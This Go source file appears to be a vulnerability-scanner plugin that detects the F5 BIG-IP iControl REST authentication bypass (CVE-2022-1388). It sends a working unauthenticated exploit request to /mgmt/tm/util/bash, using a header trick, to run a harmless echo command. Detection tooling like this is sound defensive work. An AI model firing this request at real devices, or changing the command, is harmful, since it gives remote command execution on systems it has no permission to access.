// goplugin/plugin2.go
package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"encoding/json"
	"net/http"
	"strings"
)

func init() {
	Register("f5_rce_cve_2022_1388", &f5_rce_cve_2022_1388{})
}

type f5_rce_cve_2022_1388 struct{}

func (p *f5_rce_cve_2022_1388) Info() PluginInfo {
	return PluginInfo{
		Name:     "F5 BIG-IP 远程代码执行漏洞（CVE-2022-1388）",
		VulnInfo: "F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。iControl REST 是iControl 框架的演变，使用 REpresentational State Transfer (REST)。这允许用户或脚本与 F5 设备之间进行轻量级、快速的交互。CVE-2022-1388 中，攻击者可在无需身份认证的情况下调用相关Rest API，从而执行任意命令。",
		VulnID:   "CVE-2022-1388",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "11.6.x: all; 12.1.x: all; 13.1.x: > 13.1.5; 14.1.x: > 14.1.4.6; 15.1.x: >15.1.5.1; 16.1.x: > 16.1.2.2",
		CWE:      "CWE-306	关键功能的认证机制缺失",
	}
}

func (p *f5_rce_cve_2022_1388) Check(netloc string) bool {
	data := `{
		"command": "run",
		"utilCmdArgs": "-c 'echo CVE-2022-1388'"
	}`
	req, err := http.NewRequest("POST", netloc+"/mgmt/tm/util/bash", bytes.NewBufferString(data))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-F5-Auth-Token", "a")
	req.Header.Set("Authorization", "Basic YWRtaW46")
	req.Header.Set("Connection", "Keep-Alive, X-F5-Auth-Token, X-Forwarded-Host")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 {
		var data map[string]interface{}
		err := json.Unmarshal([]byte(resp.ResponseRaw), &data)
		if err != nil {
			return false
		}

		commandResult, ok := data["commandResult"].(string)
		if !ok {
			return false
		}

		if strings.Contains(commandResult, "CVE-2022-1388") {
			return true
		}
	}

	return false
}
